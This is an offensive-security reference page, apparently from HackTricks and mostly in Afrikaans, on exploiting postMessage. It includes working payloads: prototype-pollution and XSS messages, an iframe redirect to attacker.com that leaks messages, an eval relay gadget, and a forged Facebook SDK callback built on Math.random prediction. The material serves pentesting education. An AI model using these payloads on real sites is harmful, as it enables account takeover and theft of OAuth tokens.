# PostMessage Kwetsbaarhede

{{#include ../../banners/hacktricks-training.md}}

## Stuur **PostMessage**

**PostMessage** gebruik die volgende funksie om 'n boodskap te stuur:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Note that **targetOrigin** can be a '\*' or an URL like _https://company.com._\
In the **second scenario**, the **message can only be sent to that domain** (even if the origin of the window object is different).\
If the **wildcard** is used, **messages could be sent to any domain**, and will be sent to the origin of the Window object.

### Aanval op iframe & wildcard in **targetOrigin**

As explained in [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) if you find a page that can be **iframed** (no `X-Frame-Header` protection) and that is **sending sensitive** message via **postMessage** using a **wildcard** (\*), you can **modify** the **origin** of the **iframe** and **leak** the **sensitive** message to a domain controlled by you.\
Note that if the page can be iframed but the **targetOrigin** is **set to a URL and not to a wildcard**, this **trick won't work**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener exploitation

**`addEventListener`** is die funksie wat deur JS gebruik word om die funksie te verklaar wat **`postMessages` verwag**.\
'n kode soortgelyk aan die volgende een sal gebruik word:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Let asseblief daarop let hoe die **eerste ding** wat die kode doen, is om die **origin te kontroleer**. Dit is uiters **belangrik**, veral as die bladsy enige **sensitiewe** aksie met die ontvangde inligting gaan uitvoer (bv. 'n wagwoord verander). **As dit nie die origin kontroleer nie, kan aanvallers slagoffers laat arbitrêre data na hierdie endpoints stuur** en in hierdie voorbeeld die slagoffer se wagwoorde verander.

### Enumerasie

Om **event listeners** op die huidige bladsy te vind kan jy:

- **Soek** die JS-kode vir `window.addEventListener` en `$(window).on` (_JQuery version_)
- **Voer uit** in die developer tools console: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Gaan na** _Elements --> Event Listeners_ in die developer tools van die blaaier

![](<../../images/image (396).png>)

- Gebruik 'n **browser extension** soos [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) of [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Hierdie browser extension sal **al die boodskappe onderskep** en aan jou wys.

### Origin check omseilings

- Die **`event.isTrusted`** attribuut word as veilig beskou aangesien dit `True` slegs teruggee vir events wat deur genuë gebruiker-aksies gegenereer is. Alhoewel dit moeilik is om te omseil as dit korrek geïmplementeer is, is die betekenis in sekuriteitskontroles noemenswaardig.
- Die gebruik van **`indexOf()`** vir origin-validasie in postMessage events kan vatbaar wees vir omseiling. 'n Voorbeeld wat hierdie kwesbaarheid illustreer is:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- Die **`search()`** metode van `String.prototype.search()` is bedoel vir regular expressions, nie strings nie. Om iets anders as 'n regexp te gee lei tot implisiete omskakeling na regex, wat die metode moontlik onveilig maak. Dit is omdat in regex 'n punt (.) as 'n wildcard optree, wat omseiling van validasie met spesiaal aangepaste domeine moontlik maak. Byvoorbeeld:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- Die **`match()`** funksie, soortgelyk aan `search()`, verwerk regex. As die regex verkeerd saamgestel is, kan dit vatbaar wees vir omseiling.
- Die **`escapeHtml`** funksie is bedoel om insette te sanitiseer deur karakters te escape. Dit skep egter nie 'n nuwe escaped object nie maar oorskryf die eienskappe van die bestaande object. Hierdie gedraging kan uitgebuit word. Veral as 'n object so gemanipuleer kan word dat sy beheerde eienskap nie `hasOwnProperty` erken nie, sal die `escapeHtml` nie soos verwag werk nie. Dit word in die voorbeelde hieronder gedemonstreer:

- Expected Failure:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Bypassing the escape:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

In die konteks van hierdie kwesbaarheid is die `File` object merkwaardig uitbuitbaar as gevolg van sy read-only `name` property. Hierdie property, wanneer dit in templates gebruik word, word nie deur die `escapeHtml` funksie gesanitiseer nie, wat tot potensiële sekuriteitsrisiko's lei.

- Die `document.domain` property in JavaScript kan deur 'n script gestel word om die domein te verkort, wat 'n meer toegeeflike toepassing van die same-origin policy binne dieselfde parent domain moontlik maak.

### Alleen origin-vertroue + vertroude relais

As 'n ontvanger slegs **`event.origin`** kontroleer (bv. vertrou enige `*.trusted.com`) kan jy dikwels 'n **"relay" bladsy op daardie origin vind wat aanvaller-beheerde params via `postMessage` terugkaats** na 'n gespesifiseerde `targetOrigin`/`targetWindow`. Voorbeelde sluit in bemarkings-/analytics-gadgets wat query params neem en `{msg_type, access_token, ...}` na `opener`/`parent` stuur. Jy kan:

- **Open die slagoffer-bladsy in 'n popup/iframe wat 'n `opener` het** sodat sy handlers registreer (baie pixels/SDKs heg net listeners wanneer `window.opener` bestaan).
- **Navigeer 'n ander aanvaller-venster na die relay endpoint op die vertroude origin**, en vul boodskapvelde wat jy ingespuit wil hê (message type, tokens, nonces).
- Omdat die boodskap nou **van die vertroude origin** kom, slaag origin-only validasie en kan jy bevoorregte gedrag (state changes, API calls, DOM writes) in die slagoffer se listener uitlokk.

Misbruikpatrone wat in die veld gesien is:

- Analytics SDKs (bv. pixel/fbevents-style) verbruik boodskappe soos `FACEBOOK_IWL_BOOTSTRAP`, en **roep dan backend APIs aan met 'n token wat in die boodskap voorsien is** en sluit **`location.href` / `document.referrer`** in die versoekliggaam in. As jy jou eie token voorsien, kan jy **dié versoeke in die token se versoekgeskiedenis/logs lees** en eksfil **OAuth codes/tokens** wat in die URL/referrer van die slagoffer-bladsy voorkom.
- Enige relay wat arbitrêre velde in `postMessage` reflekteer, laat jou toe om **message types te spoof** wat deur bevoorregte listeners verwag word. Kombineer dit met swak input-validasie om Graph/REST oproepe, funksie-vrystellings, of CSRF-ekwivalente flows te bereik.

Jagwenke: enumereer `postMessage` listeners wat slegs `event.origin` kontroleer, en soek dan **same-origin HTML/JS endpoints wat URL-params via `postMessage` deurstuur** (marketing previews, login popups, OAuth foutbladsye). Koppel beide saam met `window.open()` + `postMessage` om origin checks te omseil.

### e.origin == window.origin omseiling

When embedding a web page within a **sandboxed iframe** using %%%%%%, it's crucial to understand that the iframe's origin will be set to null. This is particularly important when dealing with **sandbox attributes** and their implications on security and functionality.

By specifying **`allow-popups`** in the sandbox attribute, any popup window opened from within the iframe inherits the sandbox restrictions of its parent. This means that unless the **`allow-popups-to-escape-sandbox`** attribute is also included, the popup window's origin is similarly set to `null`, aligning with the iframe's origin.

Consequently, when a popup is opened under these conditions and a message is sent from the iframe to the popup using **`postMessage`**, both the sending and receiving ends have their origins set to `null`. This situation leads to a scenario where **`e.origin == window.origin`** evaluates to true (`null == null`), because both the iframe and the popup share the same origin value of `null`.

For more information **read**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Omseiling van e.source

Dit is moontlik om te kontroleer of die boodskap vanaf dieselfde venster gekom het waarin die script luister (veral interessant vir **Content Scripts van browser extensions** om te kontroleer of die boodskap vanaf dieselfde bladsy gestuur is):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
Jy kan die **`e.source`** van 'n boodskap dwing om null te wees deur 'n **iframe** te skep wat die **postMessage** **stuur** en onmiddellik **verwyder** word.

Vir meer inligting **lees:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header omseiling

Om hierdie aanvalle uit te voer sal dit ideaal wees as jy die **plaas die slagoffer se webbladsy** binne 'n `iframe` kan plaas. Maar sommige headers soos `X-Frame-Header` kan daardie **voorkom** daardie **gedrag** .\
In daardie scenario's kan jy steeds 'n minder sluipende aanval gebruik. Jy kan 'n nuwe tabblad na die kwesbare webtoepassing oopmaak en daarmee kommunikeer:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Boodskap gesteel wat aan child iframe gestuur is deur die hoofblad te blokkeer

In die volgende bladsy kan jy sien hoe jy 'n **sensitiewe postmessage data** wat aan 'n **child iframe** gestuur word kan steel deur die **hoofblad** te **blokkeer** voordat die data gestuur word en 'n **XSS in die child** te misbruik om die data te **leak** voordat dit ontvang word:


{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### Boodskap steel deur die iframe ligging te verander

As jy 'n webpage kan iframe sonder X-Frame-Header wat nog 'n iframe bevat, kan jy die **verander die ligging van daardie child iframe**, so as dit 'n **postmessage** ontvang wat met 'n **wildcard** gestuur is, kan 'n aanvaller daardie iframe se **origin** na 'n bladsy **beheerd** deur hom **verander** en die **boodskap** **steel**:


{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage na Prototype Pollution and/or XSS

In scenario's waar die data wat deur `postMessage` gestuur word deur JS uitgevoer word, kan jy die **page** iframe en die **prototype pollution/XSS** misbruik deur die exploit via `postMessage` te stuur.

'n Paar **baie goed verduidelikte XSS deur `postMessage`** kan gevind word by [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Voorbeeld van 'n exploit om **Prototype Pollution and then XSS** deur 'n `postMessage` na 'n `iframe` te misbruik:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
Vir **meer inligting**:

- Skakel na bladsy oor [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- Skakel na bladsy oor [**XSS**](../xss-cross-site-scripting/index.html)
- Skakel na bladsy oor [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### Oorsprong-afgeleide skriplaai & voorsieningsketting pivot (CAPIG gevallestudie)

`capig-events.js` only registered a `message` handler when `window.opener` existed. On `IWL_BOOTSTRAP` it checked `pixel_id` but stored `event.origin` and later used it to build `${host}/sdk/${pixel_id}/iwl.js`.

<details>
<summary>Behandelaar wat aanvaller-gekontroleerde oorsprong skryf</summary>
```javascript
if (window.opener) {
window.addEventListener("message", (event) => {
if (
!localStorage.getItem("AHP_IWL_CONFIG_STORAGE_KEY") &&
!localStorage.getItem("FACEBOOK_IWL_CONFIG_STORAGE_KEY") &&
event.data.msg_type === "IWL_BOOTSTRAP" &&
checkInList(g.pixels, event.data.pixel_id) !== -1
) {
localStorage.setItem("AHP_IWL_CONFIG_STORAGE_KEY", {
pixelID: event.data.pixel_id,
host: event.origin,
sessionStartTime: event.data.session_start_time,
})
startIWL() // loads `${host}/sdk/${pixel_id}/iwl.js`
}
})
}
```
</details>

**Exploit (origin → script-src pivot):**
1. Kry 'n opener: bv., in Facebook Android WebView hergebruik `window.name` met `window.open(target, name)` sodat die venster sy eie opener word, en post dan 'n boodskap vanaf 'n kwaadwillige iframe.
2. Stuur `IWL_BOOTSTRAP` vanaf enige origin om `host = event.origin` in `localStorage` te bewaar.
3. Host `/sdk/<pixel_id>/iwl.js` op enige CSP-allowed origin (takeover/XSS/upload op 'n witgelys analytics-domein). `startIWL()` laai dan attacker JS in die embedding site (bv., `www.meta.com`), wat geauthentiseerde cross-origin-oproepe en rekening-oornames moontlik maak.

As direkte opener-beheer onmoontlik was, het die kompromittering van 'n derde-party iframe op die bladsy steeds toegelaat om die gekonfekteerde `postMessage` na die parent te stuur om die gestoor host te vergiftig en die skriplaai af te dwing.

**Backend-gegenereerde gedeelde skrip → stored XSS:** die plugin `AHPixelIWLParametersPlugin` het gebruikerreël-parameters aaneen geplak in JS wat by `capig-events.js` gevoeg is (bv., `cbq.config.set(...)`). Die inspuiting van breakouts soos `"]}` het ewekansige JS ingespuit, wat stored XSS in die gedeelde skrip geskep het wat aan alle sites wat dit laai bedien is.

### Trusted-origin allowlist isn't a boundary

'n streng `event.origin`-kontrole werk slegs as die **trusted origin nie attacker JS kan uitvoer nie**. Wanneer bevoorregte bladsye derde-party iframes insluit en aanvaar dat `event.origin === "https://partner.com"` veilig is, word enige XSS in `partner.com` 'n brug na die parent:
```javascript
// Parent (trusted page)
window.addEventListener("message", (e) => {
if (e.origin !== "https://partner.com") return
const [type, html] = e.data.split("|")
if (type === "Partner.learnMore") target.innerHTML = html // DOM XSS
})
```
Aanvalspatroon wat in die wild waargeneem is:

1. **Benut XSS in die vennoot iframe** en plaas 'n relay gadget sodat enige `postMessage` code exec binne die betroubare oorsprong word:
```html
<img src="" onerror="onmessage=(e)=>{eval(e.data.cmd)};">
```
2. **Van die attacker bladsy**, stuur JS na die gekompromitteerde iframe wat 'n toegelate boodskaptipe terug na die parent stuur. Die boodskap kom van `partner.com`, slaag die allowlist, en dra HTML wat onveilig ingevoeg word:
```javascript
postMessage({
cmd: `top.frames[1].postMessage('Partner.learnMore|<img src="" onerror="alert(document.domain)">|b|c', '*')`
}, "*")
```
3. Die parent injecteer die attacker HTML, wat **JS execution in the parent origin** (bv. `facebook.com`) gee, wat dan gebruik kan word om OAuth-kodes te steel of te pivot na volledige account takeover flows.

Key takeaways:

- **Partner origin isn't a boundary**: enige XSS in 'n "trusted" partner laat aanvallers toe om toegelate boodskappe te stuur wat `event.origin` kontrole omseil.
- Handlers wat **render partner-controlled payloads** (bv. `innerHTML` op spesifieke message types) maak partner compromise 'n same-origin DOM XSS.
- 'n Breë **message surface** (baie types, geen struktuurvalidasie) gee meer gadgets vir pivoting sodra 'n partner iframe gekompromitteer is.

### Voorspelling van **`Math.random()`** callback tokens in postMessage bridges

Wanneer boodskapvalidasie 'n “shared secret” gebruik wat gegenereer is met `Math.random()` (bv. `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) en dieselfde helper ook plugin iframes benoem, kan jy PRNG outputs herstel en trusted messages vervals:

- **Leak PRNG outputs via `window.name`:** Die SDK gee outomaties name aan plugin iframes met `guid()`. As jy die top frame beheer, iframe die victim page, navigeer dan die plugin iframe na jou origin (bv. `window.frames[0].frames[0].location='https://attacker.com'`) en lees `window.frames[0].frames[0].name` om 'n rou `Math.random()` output te kry.
- **Force more outputs without reloads:** Sommige SDKs bied 'n reinit-pad; in die FB SDK sal die stuur van `init:post` met `{xfbml:1}` `XFBML.parse()` afdwing, die plugin iframe vernietig/herskepping, en nuwe name/callback IDs genereer. Herhaalde reinit produseer soveel PRNG outputs as nodig (let op ekstra interne `Math.random()` oproepe vir callback/iframe IDs, dus oplossers moet tussenliggende waardes oorslaan).
- **Trusted-origin delivery via parameter pollution:** As 'n first-party plugin endpoint 'n onsanitiseerde parameter in die cross-window payload reflekteer (bv. `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), kan jy `&type=...&iconSVG=...` injekteer terwyl die trusted `facebook.com` origin behou bly.
- **Predict the next callback:** Skakel leaked iframe names terug na floats in `[0,1)` en voer verskeie waardes (selfs nie-opvolgend) in 'n V8 `Math.random` voorspellingsmodel (bv. Z3-gebaseerd). Genereer die volgende `guid()` lokaal om die verwagte callback-token te vervals.
- **Trigger the sink:** Stel die postMessage-data so op dat die bridge `xd.mpn.setupIconIframe` dispatch en HTML in `iconSVG` injekteer (bv. URL-encoded `<img src=x onerror=...>`), wat DOM XSS binne die hosting origin bewerkstellig; van daar af kan same-origin iframes (OAuth dialogs, arbiters, ens.) gelees word.
- **Framing quirks help:** Die ketting vereis framing. In sommige mobiele webviews kan `X-Frame-Options` degradeer na die ongeskikte `ALLOW-FROM` wanneer `frame-ancestors` teenwoordig is, en “compat” parameters kan permissiewe `frame-ancestors` afdwing, wat die `window.name` side channel moontlik maak.

#### Minimale vervalste boodskapvoorbeeld
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## Verwysings

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)
- Om te oefen: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [CAPIG postMessage origin trust → script loading + stored JS injection](https://ysamm.com/uncategorized/2025/01/13/capig-xss.html)
- [Self XSS Facebook Payments](https://ysamm.com/uncategorized/2026/01/15/self-xss-facebook-payments.html)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
